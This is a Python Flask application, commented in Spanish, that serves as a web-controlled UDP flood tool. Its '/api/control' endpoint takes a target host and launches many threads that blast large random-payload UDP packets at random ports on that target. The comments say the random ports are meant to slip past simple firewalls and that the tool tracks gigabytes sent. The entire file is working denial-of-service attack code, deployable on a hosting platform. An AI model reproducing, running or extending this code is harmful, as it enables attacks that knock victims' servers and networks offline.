import threading
import time
import random
import socket
import os
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- Motor de Ataque ---
bots_activos = False
stats = {"total_mb": 0, "hilos": 0, "ip": "0.0.0.0"}

def flood_engine(target_ip):
    global bots_activos, stats
    stats["hilos"] += 1
    
    # Creamos el socket de alta velocidad
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generamos 1MB de basura aleatoria en RAM para disparar rápido
    # 1024 KB * 1024 = 1MB
    payload = random._urandom(1024 * 60) # Paquete UDP máximo optimizado
    
    while bots_activos:
        try:
            # Enviamos ráfaga para completar los 1000MB del loop
            for _ in range(16500): 
                if not bots_activos: break
                # Disparo a puerto aleatorio para saltar firewalls simples
                port = random.randint(1, 65535)
                sock.sendto(payload, (target_ip, port))
            
            stats["total_mb"] += 1000 # Reportamos el Giga enviado
        except Exception as e:
            time.sleep(0.1) # Pausa mínima si el sistema satura el socket
            
    stats["hilos"] -= 1

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/control', methods=['POST'])
def control():
    global bots_activos, stats
    data = request.json
    
    if data.get("action") == "start":
        if bots_activos: return jsonify({"status": "BUSY"})
        
        target = data.get("target").strip()
        # Limpiar entrada por si ponen basura
        target = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        
        try:
            # Esto confirma que la IP es real y alcanzable
            target_ip = socket.gethostbyname(target)
            stats["ip"] = target_ip
        except:
            return jsonify({"status": "INVALID IP"})

        bots_activos = True
        num_threads = int(data.get("threads", 10))
        
        for _ in range(num_threads):
            threading.Thread(target=flood_engine, args=(target_ip,), daemon=True).start()
            
        return jsonify({"status": "ATTACKING"})
    
    bots_activos = False
    stats["ip"] = "0.0.0.0"
    return jsonify({"status": "STOPPED"})

@app.route('/api/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    # Puerto dinámico para Railway
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
